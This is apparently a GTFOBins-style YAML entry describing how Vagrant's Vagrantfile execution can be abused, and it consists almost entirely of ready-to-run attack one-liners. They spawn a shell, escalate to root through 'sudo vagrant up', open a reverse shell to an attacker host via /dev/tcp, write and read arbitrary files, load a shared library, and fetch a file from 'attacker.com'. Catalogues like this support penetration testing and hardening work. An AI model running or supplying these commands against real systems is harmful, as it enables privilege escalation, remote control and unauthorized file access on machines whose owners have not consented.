---
description: |
Vagrant can execute arbitrary ruby code when starting up. The Commands down below create a new directory "pwn" in the tmp-folder where vagrant then is initialized. After that the command is pasted into the Vagrantfile and executed.
More Info at https://gtfobins.github.io/gtfobins/ruby/
functions:
  shell:
    - code: mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'exec "/bin/sh"' > Vagrantfile && vagrant up
    -
  sudo:
    - code: mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'exec "/bin/sh"' > Vagrantfile && sudo vagrant up
  reverse-shell:
    - description: |
        Run `nc -lvnp RPORT` on the attacker box.
        Replace RHOST and RPORT with the attacker ip and port to gain a reverse shell.
      code: |
        mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'exec "sh -i &>/dev/tcp/RHOST/RPORT <&1"' > Vagrantfile && vagrant up
  file-write:
    - code: mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'File.open("file_to_write", "w+") { |f| f.write("DATA") }' > Vagrantfile && vagrant up
  file-read:
    - code: mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'puts File.read("file_to_read")' > Vagrantfile && vagrant up
  library-load:
    - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        mkdir /tmp/pwn && cd /tmp/pwn && vagrant init && echo 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])' > Vagrantfile && vagrant up
---

